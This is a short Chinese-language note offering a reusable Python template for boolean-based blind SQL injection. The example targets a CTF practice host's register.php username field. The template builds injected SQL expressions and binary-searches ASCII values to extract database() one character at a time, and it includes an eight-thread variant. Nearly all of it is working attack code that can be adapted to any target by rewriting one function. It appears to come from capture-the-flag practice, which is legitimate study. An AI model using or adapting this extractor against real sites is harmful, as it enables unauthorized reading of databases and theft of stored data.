# 介绍
	- SQL布尔注入的python脚本模板，根据具体环境实现一个函数`guessfunc`即可进行布尔注入
	- 支持多线程获取
- 模板如下：
- ```python
  from typing import Callable
  import threading
  import functools
  import requests
  
  url = "http://631cadab-127a-4952-b952-ed43b993795f.node4.buuoj.cn:81/"
  
  def guessfunc(target: str, pos: int, guess: int):
      """
      获取target的第pos个字符，判断其的ascii码是否大于guess
      """
      expression = f"ascii(mid({target},{pos},1))-{guess}-1"
      sql = f"admin' and ascii(substr(({expression}),1,1))-45 and '1"
      r = requests.get(url + "register.php", params={"username": sql, "password": "1"})
      if "error" in r.text:
          raise Exception()
      return "this username had been used" in r.text
  
  
  
  class ValueGuesser:
      def __init__(self, guessfunc, target, mute=False):
          self.guessfunc: Callable[[str, int, int], bool] = guessfunc
          self.target = target
          self.mute = mute
  
      def getvalue_char(self, pos):
          l, r = 0, 256
          while r - l > 1:
              mid = (l + r) // 2
              isgreater = self.guessfunc(self.target, pos, mid)
              if isgreater:
                  l = mid
                  if not self.mute:
                      print(".", end="", flush=True)
              else:
                  r = mid
                  if not self.mute:
                      print("-", end="", flush=True)
          if 32 <= r < 255:
              if not self.mute:
                  print(chr(r))
              return chr(r)
          else:
              return None
  
      def getvalue(self):
          ans = ""
          while True:
              c = self.getvalue_char(len(ans) + 1)
              if c is not None:
                  ans += c
              else:
                  break
          return ans if ans != "" else None
  
      def getvalue_multi(self):
          ans = {}
          threads = []
          def get_and_collect(pos):
              ans[pos] = self.getvalue_char(pos)
          p = 1
          while True:
              isctrl = not self.guessfunc(self.target, p, 31)
              if isctrl:
                  break
              t = threading.Thread(target = get_and_collect, args=(p, ))
              t.daemon=True
              t.start()
              threads.append(t)
              if len(threads) >= 8:
                  t = threads.pop()
                  t.join()
              p += 1
          for t in threads:
              t.join()
          assert all(i in ans for i in range(1, p)), "missing: " + repr([i not in ans for i in range(1, p)])
          return "".join(ans[i] for i in range(1, p))
  
  if __name__ == "__main__":
      # 示例：获取database()
      guesser = ValueGuesser(guessfunc, "database()")
      value = guesser.getvalue()
      # 网速慢也有多线程版本可用
      # value = guesser.getvalue_multi()
      print()
      print(value)
      print(repr(value))
  ```